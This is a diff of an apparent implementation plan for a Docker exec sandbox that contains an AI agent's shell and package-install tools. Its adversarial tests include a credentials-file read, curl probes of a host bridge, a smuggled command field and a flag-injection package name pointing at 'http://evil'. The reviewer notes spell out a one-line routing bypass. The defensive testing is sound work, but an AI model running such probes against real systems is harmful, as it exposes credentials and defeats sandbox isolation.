         packages: Distribution names, optionally pinned (e.g. ["rich", "networkx==3.3"]).
     """
+    # Local validation is a fast, clear error for the agent — NOT the control.
+    # The bridge re-validates and is the enforcing party.
     try:
         names = validate_packages(packages)
     except ValueError as e:
         return _err(str(e))
-    # Bootstrap the venv (idempotent) then install, both via the bridge. The
-    # install command's fixed `uv pip install ` prefix is what makes the bridge
-    # grant network for this call and only this call.
-    bootstrap = (
-        f"[ -x {VENV_PYTHON} ] || uv venv --system-site-packages {WORKSPACE_DIR}/.venv"
-    )
-    command = f"{bootstrap} && " + build_install_command(names, VENV_PYTHON)
-    return _run_and_format(command, timeout=600)
+    # Names only. The bridge owns the whole command (venv bootstrap included),
+    # so the networked endpoint cannot be handed anything to execute.
+    return _call_and_format("install", {"packages": names})
 
 
 if __name__ == "__main__":
     mcp.run(transport="stdio")
 ```
 
-Note: the `install` command string still begins its meaningful work with `uv venv ... &&`, so the bridge's `command.startswith("uv pip install ")` check would route it to `network=none`. Fix the routing to also grant network when the command **contains** the install invocation. In `scripts/exec-bridge/bridge.py`, change the network selection in `handle_exec` to:
-
-```python
-    network = "bridge" if "uv pip install " in command else "none"
-```
-
-and update `test_build_docker_argv_install_uses_bridge_network` expectations already pass a `uv pip install ...` string, so they are unaffected. Add a bridge test asserting the bootstrap-prefixed form also selects bridge network (append to `bot/tests/test_exec_bridge.py`):
-
-```python
-def test_exec_install_form_gets_bridge_network(bridge):
-    base, _ = bridge
-    _, body = post(f"{base}/exec/leetcode-coach",
-                   {"command": "[ -x p ] || uv venv v && uv pip install --python p rich"},
-                   {"X-Exec-Secret": "s3cret"})
-    assert "--network bridge" in body["stdout"]
-```
+Note the division of labor: the MCP never composes a shell command for the networked path — it sends `{"packages": [...]}` and the bridge (Task 2's `build_install_command`) constructs the venv bootstrap plus the pip invocation from validated names. If you find yourself writing an install command string in `server.py`, the trust boundary has drifted back to the spoofable design.
 
 - [ ] **Step 4: Create the MCP pyproject**
 
@@ -1476,8 +1684,10 @@ Agents opted in via `allowed_tools_additional: ["mcp__sandbox__*"]` get
 shell in a throwaway `claub-exec` container that holds no secrets and mounts
 only the calling agent's workspace (same path, `/claub/workspaces/{agent}`).
 Spawned host-side by `scripts/exec-bridge/` (launchd, port 9501), mirroring the
-Playwright bridge — the Docker socket never enters the bot container. `run` has
-no network; `install` runs a fixed `uv pip install` under bridge network. The
+Playwright bridge — the Docker socket never enters the bot container. Two
+endpoints carry the trust boundary: `/exec` takes a command and always runs
+`--network none`; `/install` takes package names only, never a command, and the
+bridge validates the names and builds the argv itself. The
 `.claude/` dir is mounted read-only so injected code cannot write
 `settings.local.json` to escalate. Image built by hand:
 `docker build -t claub-exec docker/exec-sandbox/`. Design:
@@ -1509,7 +1719,7 @@ No commit — these are verified live in Task 7.
 
 ### Task 7: Adversarial suite and end-to-end smoke (integration-gated)
 
-The adversarial tests ARE the acceptance criteria for the security claims — real automated tests, gated behind `CLAUB_SANDBOX_INTEGRATION=1`, requiring the built image and a running bridge. Two are load-bearing: the `.claude/settings.local.json` write must fail, and `run` must have no reachability to `host.docker.internal`.
+The adversarial tests ARE the acceptance criteria for the security claims — real automated tests, gated behind `CLAUB_SANDBOX_INTEGRATION=1`, requiring the built image and a running bridge. Three are load-bearing: the `.claude/settings.local.json` write must fail; `run` must have no reachability to `host.docker.internal`; and a `/exec` command that merely *mentions* the install shape must still get no network (the regression test for command-substring routing).
 
 **Files:**
 - Create: `bot/tests/test_sandbox_adversarial.py`
@@ -1554,6 +1764,11 @@ def _run(command: str, timeout: int = 60) -> dict:
     return resp.json()
 
 
+def _install(payload: dict) -> httpx.Response:
+    return httpx.post(f"{URL}/install/{AGENT}", json=payload,
+                      headers={"X-Exec-Secret": SECRET}, timeout=300)
+
+
 def test_no_claude_credentials():
     out = _run("cat /root/.claude/.credentials.json 2>&1 || true")
     assert ".credentials.json" not in out["stdout"] or "No such file" in out["stdout"]
@@ -1589,6 +1804,37 @@ def test_no_network_to_host_bridge():
     assert '"running"' not in out["stdout"] and "{}" not in out["stdout"]
 
 
+def test_exec_command_mentioning_install_shape_still_has_no_network():
+    """LOAD-BEARING: asserts the network split lives in endpoint routing, not
+    command inspection. A `"uv pip install " in command` check is defeated by
+    exactly this string — it would take the networked path and reach the
+    Playwright bridge.
+    """
+    out = _run("echo 'uv pip install '; "
+               "curl -sS --max-time 5 http://host.docker.internal:9500/status 2>&1 || true")
+    assert '"running"' not in out["stdout"]
+    assert "pid" not in out["stdout"]
+
+
+def test_install_ignores_a_command_field():
+    """The networked endpoint must not accept anything executable. A `command`
+    key is never read — only `packages`.
+    """
+    resp = _install({"packages": ["rich"],
+                     "command": "curl -sS http://host.docker.internal:9500/status"})
+    assert resp.status_code == 200
+    body = resp.json()
+    assert '"running"' not in body["stdout"]
+    assert "curl" not in body["stdout"]
+
+
+def test_install_rejects_flag_injection_bridge_side():
+    """Rejected by BRIDGE-side validation — not merely by the MCP's copy."""
+    resp = _install({"packages": ["--index-url=http://evil"]})
+    assert resp.status_code == 400
+    assert "invalid package name" in resp.text
+
+
 def test_workspace_is_writable():
     out = _run(f"echo ok > /claub/workspaces/{AGENT}/.sandbox-probe && "
                f"cat /claub/workspaces/{AGENT}/.sandbox-probe && "
@@ -1617,7 +1863,7 @@ cd /Users/you/Claude/bot && CLAUB_SANDBOX_INTEGRATION=1 \
   EXEC_BRIDGE_SECRET="$(grep EXEC_BRIDGE_SECRET /Users/you/Claude/.envrc | cut -d= -f2)" \
   uv run --extra dev pytest tests/test_sandbox_adversarial.py -v
 ```
-Expected: all PASS. If `test_cannot_write_claude_settings_local` or `test_no_network_to_host_bridge` fails, STOP — the design is broken; do not proceed.
+Expected: all PASS. If `test_cannot_write_claude_settings_local`, `test_no_network_to_host_bridge`, or `test_exec_command_mentioning_install_shape_still_has_no_network` fails, STOP — the design is broken; do not proceed.
 
 - [ ] **Step 4: Deploy the wired bot and manual smoke**
 
@@ -1666,17 +1912,21 @@ Phase 2 is a shared skill plus the already-baked Manim dependency. It is **out o
 ## Self-Review
 
 **Spec coverage.**
-- Host bridge (not docker.sock) → Task 3. Ephemeral per call → the bridge spawns `docker run --rm` per request, no session. Network decision (run none / install fixed) → Global Constraints + Task 2 argv + Task 5 install shape + bridge routing. uv workspace venv → Task 5 `install` bootstrap. `claub-exec` image with mandatory aarch64 toolchain → Task 1. Bridge endpoints/config/input handling/concurrency/output cap → Tasks 2–3. MCP two tools, env agent name, truncation, bridge-down error → Tasks 4–5. `docker run` five load-bearing details (read-only `.claude`, network none, `bash -c`, clean env, path identity, extra_mounts exception) → Task 2 argv + Global Constraints. Colima prereq → Prerequisite. Timeout budget/orphan reap/kill-container → Task 3. Adversarial + bridge unit + MCP tests + manual smoke → Tasks 2/3/5/7. Configuration (agents.yaml/mcp.json/settings/bridge config/secret) → Task 6. Phasing (image FIRST) → task order enforced. Visualization layer → Task 8 placeholder. Attachments known-limitation → Task 8 open items (spec says separate change). Covered.
+- Host bridge (not docker.sock) → Task 3. Ephemeral per call → the bridge spawns `docker run --rm` per request, no session. Network decision — **two endpoints**, `/exec` always `--network none` and `/install` names-only with bridge-side validation and argv construction → Global Constraints + Task 2 (`validate_packages`, `build_install_command`, `build_docker_argv`) + Task 3 (`handle_exec` / `handle_install`) + Task 5 (MCP posts to both) + Task 7 (three routing/injection adversarial tests). uv workspace venv → Task 2 `build_install_command` bootstrap, run bridge-side. `claub-exec` image with mandatory aarch64 toolchain → Task 1. Bridge endpoints/config/input handling/concurrency/output cap → Tasks 2–3. MCP two tools, env agent name, truncation, bridge-down error → Tasks 4–5. `docker run` five load-bearing details (read-only `.claude`, network none, `bash -c`, clean env, path identity, extra_mounts exception) → Task 2 argv + Global Constraints. Colima prereq → Prerequisite. Timeout budget/orphan reap/kill-container → Task 3. Adversarial + bridge unit + MCP tests + manual smoke → Tasks 2/3/5/7. Configuration (agents.yaml/mcp.json/settings/bridge config/secret) → Task 6. Phasing (image FIRST) → task order enforced. Visualization layer → Task 8 placeholder. Attachments known-limitation → Task 8 open items (spec says separate change). Covered.
 - **Two spec items to flag to the reviewer (below), not silently worked around.**
 
 **Placeholder scan.** No TBD/TODO; every code and test step carries real content.
 
-**Type consistency.** Bridge response keys (`exit_code`, `stdout`, `stdout_truncated`, `stderr`, `stderr_truncated`, `timed_out`, `duration_s`) are produced in Task 3 `run_container` and consumed identically in Task 5 `_run_and_format` and Task 7. `build_docker_argv(agent, command, cfg, network, name)` signature is consistent across Task 2 definition, its tests, and the Task 3 caller. `validate_packages` / `build_install_command` / `truncate_tail` consistent Task 4 ↔ Task 5.
+**Type consistency.** Bridge response keys (`exit_code`, `stdout`, `stdout_truncated`, `stderr`, `stderr_truncated`, `timed_out`, `duration_s`) are produced in Task 3 `run_container` and consumed identically in Task 5 `_call_and_format` and Task 7. `build_docker_argv(agent, command, cfg, network, name)` is consistent across its Task 2 definition, its tests, and the Task 3 `_dispatch` caller. `validate_packages(packages)` and `build_install_command(agent, packages)` live in Task 2's **bridge** helpers and are called by Task 3's `handle_install`; Task 4's MCP helpers deliberately expose only `validate_packages` (convenience duplicate) and `truncate_tail`, with a test asserting `build_install_command` is absent there. Bridge handlers share one signature — `handle_exec(agent, payload)` / `handle_install(agent, payload)` — so the `do_POST` dispatch dict is type-uniform.
 
-## Notes for the reviewer (spec issues found)
+**Endpoint-change re-verification (post-amendment).** Walked the request/response shapes end to end after the split: Task 5 `run` → `{"command","timeout"}` → `/exec` → `_dispatch(..., "none", ...)`; Task 5 `install` → `{"packages"}` → `/install` → `build_install_command` → `_dispatch(..., "bridge", ...)`. Both return the same response dict, which Task 5 truncates and Task 7 asserts against. `build_docker_argv` still takes `network` as a caller-supplied argument and never inspects `command` — with a dedicated unit test (Task 2) and a bridge-level regression test (Task 3) pinning that. No caller of the removed `_post_exec` / `_run_and_format` / `VENV_PYTHON` names remains.
 
-1. **Network routing for `install` needed a correction the spec's endpoint table doesn't cover.** The spec's architecture shows a single `POST /exec/{agent}` and says `run` gets `--network none` while `install` gets bridge network under a fixed `uv pip install` command. But `install` must first bootstrap the venv (`uv venv ... && uv pip install ...`), so a naive `command.startswith("uv pip install")` check on the bridge would deny that combined command network. The plan resolves this by routing on `"uv pip install " in command` (substring, not prefix) and adds a bridge test for the bootstrap-prefixed form. This is safe because the bridge's only client is the secret-gated MCP and the secret never enters the sandbox — but it is a real detail the spec's "the command shape is fixed by the server" glosses over. Worth confirming the substring rule is acceptable, or splitting `install` into its own bridge endpoint for a cleaner trust boundary.
+## Notes for the reviewer (spec issues found — all resolved)
 
-2. **The spec's `permissions.deny` double-slash note is already live in the instance settings** (`Read(//root/.claude/...)`, `Read(//claub/config/**)` are present in the current `~/docker/claub/config/settings.json`). Nothing to add there for phase 1, but the spec presents it as prospective ("if it is ever needed") — it is in fact already deployed, so re-verifying those rules still deny after a CLI bump belongs in the Task 7 post-upgrade checklist (added).
+1. **`install` network routing — RESOLVED by spec amendment 8805945.** Planning first read the spec's "the command shape is fixed by the server" as a command-substring check in the bridge, and hit a wrinkle: `install` must bootstrap the venv first, so a `startswith("uv pip install")` check would deny it network. The substring fix that seemed to follow is **wrong and is not in this plan** — `"uv pip install " in command` is defeated in one line by `run("echo 'uv pip install '; curl http://host.docker.internal:9500/status")`, which takes the networked path and reaches the Playwright bridge. Secret-gating the bridge does not help: the sandbox is not calling the bridge in that attack, it is receiving network *from* it. Routing on a request field (`{"network": true}`) fails differently — it moves the decision into the bot container, which the bridge's allowlist already treats as potentially compromised.
+
+   The spec now specifies **two endpoints**, and this plan implements that: `/exec` always passes `--network none`; `/install` never receives a command at all, takes package names, and the **bridge** validates them and builds the argv (venv bootstrap included). The networked path is structurally incapable of running an arbitrary command rather than being checked for it. This also dissolves the bootstrap wrinkle entirely — the bridge owns the whole command, so there is nothing to pattern-match. The MCP keeps a duplicate validator, explicitly marked convenience-only in code comments and guarded by a test asserting the MCP has no `build_install_command`.
+
+2. **The spec's `permissions.deny` double-slash note is already live in the instance settings** (`Read(//root/.claude/...)`, `Read(//claub/config/**)` are present in the current `~/docker/claub/config/settings.json` — deployed by a separate agent this session, narrowed to targeted paths after a blanket rule proved overbroad). Nothing to add for phase 1; re-verifying those rules still deny after a CLI bump is in the Task 7 post-upgrade checklist.
 
 3. Everything else in the spec was implementable as written.
